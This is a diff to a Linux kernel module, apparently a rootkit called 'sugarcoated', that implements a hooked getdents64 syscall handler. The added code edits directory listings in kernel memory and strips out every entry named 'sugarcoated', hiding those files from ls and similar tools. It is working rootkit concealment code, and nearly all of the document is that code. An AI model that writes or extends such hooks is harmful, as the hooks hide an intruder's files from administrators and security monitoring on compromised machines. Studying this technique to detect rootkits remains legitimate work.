@@ -1,6 +1,7 @@
 #include "kmod.h"
 
 #include <asm/text-patching.h>
+#include <linux/dirent.h>
 #include <linux/kallsyms.h>
 #include <linux/kprobes.h>
 
@@ -17,10 +18,72 @@ static struct hook {
 	s32 rel_trampoline; /* near, relative */
 } hooks[HOOKS_CNT];
 
+/* rdi = unsigned int fd
+ * rsi = struct linux_dirent64 *dirent
+ * rdx = unsigned int count
+ */
 static long getdents64(const struct pt_regs *regs)
 {
-	// printk("getdents64() trampoline called!!\n");
-	return hooks[HOOK_GETDENTS64].target(regs);
+	void __user *ubuf;
+	unsigned char *kbuf;
+	struct linux_dirent64 *dir, *prev = NULL;
+	long err, read, hidden, pos;
+
+	ubuf = (void __user *)regs->si;
+
+	if ((read = hooks[HOOK_GETDENTS64].target(regs)) <= 0)
+		return read;
+
+	if (!(kbuf = kmalloc(read, GFP_KERNEL))) {
+		err = -ENOMEM;
+		goto err_kmalloc;
+	}
+
+	if (copy_from_user(kbuf, ubuf, read)) {
+		err = -EFAULT;
+		goto err_copy_from_user;
+	}
+
+	pos = 0;
+	hidden = 0;
+
+	while (pos < read - hidden) {
+		dir = (struct linux_dirent64 *)(kbuf + pos);
+
+		if (strcmp(dir->d_name, "sugarcoated") != 0) {
+			prev = dir;
+			pos += dir->d_reclen;
+			continue;
+		}
+
+		/* i tried always using memmove() to hide entries, but on some
+		 * cases it caused ls output to be weird and corrupted. i'm not
+		 * sure why, it may be d_off, but anyways, this works better */
+
+		if ((unsigned char *)dir == kbuf) {
+			hidden += dir->d_reclen;
+			memmove(kbuf, kbuf + dir->d_reclen, read - hidden);
+			continue;
+		}
+
+		prev->d_reclen += dir->d_reclen;
+		pos += dir->d_reclen;
+	}
+
+	if (copy_to_user(ubuf, kbuf, read - hidden)) {
+		err = -EFAULT;
+		goto err_copy_to_user;
+	}
+
+	kfree(kbuf);
+	return read - hidden;
+
+err_copy_to_user:
+err_copy_from_user:
+	kfree(kbuf);
+
+err_kmalloc:
+	return err;
 }
 
 static struct hook hooks[HOOKS_CNT] = {
